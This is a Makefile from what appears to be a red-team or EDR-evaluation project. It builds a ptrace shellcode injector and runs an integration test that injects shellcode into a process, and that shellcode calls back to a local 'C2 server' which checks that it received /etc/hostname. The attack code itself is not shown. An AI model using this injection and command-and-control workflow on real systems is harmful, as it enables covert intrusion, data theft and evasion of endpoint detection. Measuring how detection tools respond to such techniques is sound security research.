CC      := gcc
CFLAGS  := -Wall -Wextra -O0 -g
IFLAGS  := -I/usr/include/x86_64-linux-gnu

all: injector/inject runner

injector/inject: injector/inject_ptrace.c
	$(CC) $(CFLAGS) $(IFLAGS) -o $@ $<
	@echo "[+] Built: $@"

runner: runner.c
	$(CC) $(CFLAGS) $(IFLAGS) -o $@ $<
	@echo "[+] Built: $@"

# Quick functional test (no root needed — just checks the binary exists and help works)
check:
	@./injector/inject 2>&1 | grep -q "Usage:" && echo "[+] inject binary OK"
	@./runner 2>&1 | grep -q "Usage:" && echo "[+] runner binary OK"
	@python3 c2_server.py --help > /dev/null && echo "[+] c2_server.py OK"
	@bash -n run_matrix.sh && echo "[+] run_matrix.sh syntax OK"

# Full integration test — requires root and a working shellcode
# Usage: sudo make test SC=../shellcode/combined/shellcode.bin
SC ?= ../shellcode/combined/shellcode.bin
test: injector/inject
	@echo "[*] Starting C2 server..."
	@python3 c2_server.py --port 14444 --output /tmp/test_recv.bin \
	    --verify /etc/hostname --timeout 15 --quiet &
	@sleep 0.5
	@echo "[*] Starting target..."
	@sleep 30 &
	@TARGET=$$!; \
	 python3 ../builder/patch_config.py $(SC) --ip 127.0.0.1 --port 14444 \
	     --out /tmp/test_sc.bin 2>/dev/null || cp $(SC) /tmp/test_sc.bin; \
	 echo "[*] Injecting..."; \
	 ./injector/inject $$TARGET /tmp/test_sc.bin; \
	 sleep 2; kill $$TARGET 2>/dev/null || true
	@wait
	@echo "[+] Integration test complete — check /tmp/test_recv.bin"
	@rm -f /tmp/test_sc.bin

clean:
	rm -f injector/inject runner
	rm -f results/edr_matrix.md   # generated only — hand-captured evidence
	                              # (falco_edr_comparison.md, *.cast) stays
	rm -f /tmp/sc_matrix_*.bin /tmp/c2_recv_*.bin

.PHONY: all check test clean